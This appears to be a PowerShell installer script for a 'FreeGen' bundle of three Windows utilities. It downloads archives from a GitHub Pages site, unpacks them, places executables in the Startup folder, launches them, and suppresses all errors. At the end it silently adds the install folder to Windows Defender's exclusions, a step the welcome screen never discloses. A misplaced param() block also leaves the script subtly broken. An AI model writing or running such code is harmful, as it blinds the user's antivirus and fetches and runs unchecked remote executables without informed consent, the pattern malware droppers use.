# Приветствие и информация об установке
Write-Host ""
Write-Host "==================================================" -ForegroundColor Cyan
Write-Host "        Мастер развертывания от FreeGen" -ForegroundColor Cyan
Write-Host "==================================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "Будет установлен следующий пакет программ:" -ForegroundColor White
Write-Host ""
Write-Host "• SetLuma / Управление яркостью монитора по WMI/DDC" -ForegroundColor White
Write-Host "• Package Installer / Менеджер пакетов Chocolatey" -ForegroundColor White
Write-Host "• NanoStat / Клиент для NanoStat Device" -ForegroundColor White
Write-Host ""
Write-Host "Для продолжения установки нажмите любую клавишу..." -ForegroundColor Green
Write-Host "Для отмены установки закройте окно (Ctrl+C)" -ForegroundColor Red

# Ожидание нажатия любой клавиши
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
Write-Host ""
Write-Host "Начинаем установку..." -ForegroundColor Green
Write-Host ""

# Пути
param(
    [string]$InstallPath = "$env:LOCALAPPDATA\FreeGen"
)

# Скрываем вывод всех команд
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

# Пакеты для установки
$Packages = @(
    @{
        Name = "SetLuma"
        URL = "https://free-gen.github.io/downloads/SetLuma.zip"
        ExeFile = "SetLuma.exe"
        AutoRun = $true
        Launch = $true
        DesktopIcon = $false
    },
    @{
        Name = "Package Installer"
        URL = "https://free-gen.github.io/downloads/PackageInstaller.zip"
        ExeFile = "PackageInstaller.exe"
        AutoRun = $false
        Launch = $false
        DesktopIcon = $true
    },
    @{
        Name = "NanoStat"
        URL = "https://free-gen.github.io/downloads/NanoStat.zip"
        ExeFile = "NanoStat.exe"
        AutoRun = $true
        Launch = $true
        DesktopIcon = $false
        LaunchArgs = "--min"
    }
)

# Функция установки пакета с обновляемым выводом
function Install-Package {
    param($Package)
    
    $status = @{
        Downloaded = $false
        Extracted = $false
        StartupShortcut = $false
        DesktopShortcut = $false
        Started = $false
    }
    
    # Функция обновления отображения
    function Show-Progress {
        Clear-Host
        Write-Host "Установка $($Package.Name)..." -ForegroundColor Yellow
        
        if ($status.Downloaded) { 
            Write-Host "  ✓ Скачано" -ForegroundColor Green
        } else {
            Write-Host "  ○ Скачано" -ForegroundColor Gray
        }
        
        if ($status.Extracted) { 
            Write-Host "  ✓ Распаковано" -ForegroundColor Green
        } else {
            Write-Host "  ○ Распаковано" -ForegroundColor Gray
        }
        
        if ($Package.AutoRun -and $status.StartupShortcut) { 
            Write-Host "  ✓ Ярлык в автозагрузке" -ForegroundColor Green
        } elseif ($Package.AutoRun) {
            Write-Host "  ○ Ярлык в автозагрузке" -ForegroundColor Gray
        }
        
        if ($Package.DesktopIcon -and $status.DesktopShortcut) { 
            Write-Host "  ✓ Ярлык на рабочем столе" -ForegroundColor Green
        } elseif ($Package.DesktopIcon) {
            Write-Host "  ○ Ярлык на рабочем столе" -ForegroundColor Gray
        }
        
        if ($Package.Launch -and $status.Started) { 
            Write-Host "  ✓ Приложение запущено" -ForegroundColor Green
        } elseif ($Package.Launch) {
            Write-Host "  ○ Приложение запущено" -ForegroundColor Gray
        }
    }
    
    # Начальное отображение
    Show-Progress
    
    # Скачивание
    $zipFile = "$env:TEMP\$($Package.Name).zip"
    try {
        Invoke-WebRequest -Uri $Package.URL -OutFile $zipFile
        $status.Downloaded = $true
        Show-Progress
    } catch {
        return
    }
    
    # Создание папки
    $packagePath = "$InstallPath\$($Package.Name)"
    New-Item -ItemType Directory -Path $packagePath -Force | Out-Null
    
    # Распаковка
    try {
        Expand-Archive -Path $zipFile -DestinationPath $packagePath -Force
        $status.Extracted = $true
        Show-Progress
    } catch {
        try {
            & tar -xf $zipFile -C $packagePath
            $status.Extracted = $true
            Show-Progress
        } catch {
            return
        }
    }
    
    # Удаление архива
    Remove-Item $zipFile -Force -ErrorAction SilentlyContinue
    
    # Ярлык в автозагрузку
    if ($Package.AutoRun) {
        $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$($Package.Name).lnk"
        $WshShell = New-Object -ComObject WScript.Shell
        $Shortcut = $WshShell.CreateShortcut($startupPath)
        $Shortcut.TargetPath = "$packagePath\$($Package.ExeFile)"
        if ($Package.LaunchArgs) { $Shortcut.Arguments = $Package.LaunchArgs }
        $Shortcut.WorkingDirectory = $packagePath
        $Shortcut.Save()
        $status.StartupShortcut = $true
        Show-Progress
    }
    
    # Ярлык на рабочий стол
    if ($Package.DesktopIcon) {
        $desktopPath = "$env:USERPROFILE\Desktop\$($Package.Name).lnk"
        $WshShell = New-Object -ComObject WScript.Shell
        $Shortcut = $WshShell.CreateShortcut($desktopPath)
        $Shortcut.TargetPath = "$packagePath\$($Package.ExeFile)"
        $Shortcut.WorkingDirectory = $packagePath
        $Shortcut.Save()
        $status.DesktopShortcut = $true
        Show-Progress
    }
    
    # Запуск приложения
    if ($Package.Launch) {
        $exePath = "$packagePath\$($Package.ExeFile)"
        if (Test-Path $exePath) {
            if ($Package.LaunchArgs) {
                Start-Process -FilePath $exePath -ArgumentList $Package.LaunchArgs -WorkingDirectory $packagePath
            } else {
                Start-Process -FilePath $exePath -WorkingDirectory $packagePath
            }
            $status.Started = $true
            Show-Progress
        }
    }
}

# Основной процесс установки
foreach ($package in $Packages) {
    Install-Package -Package $package
}

# Добавление в исключения Защитника Windows
try {
    Add-MpPreference -ExclusionPath $InstallPath
} catch {}

Clear-Host
Write-Host "Установка завершена!" -ForegroundColor Green
Write-Host ""
Write-Host "Для продолжения нажмите клавишу ВВОД..." -ForegroundColor Yellow
$null = Read-Host





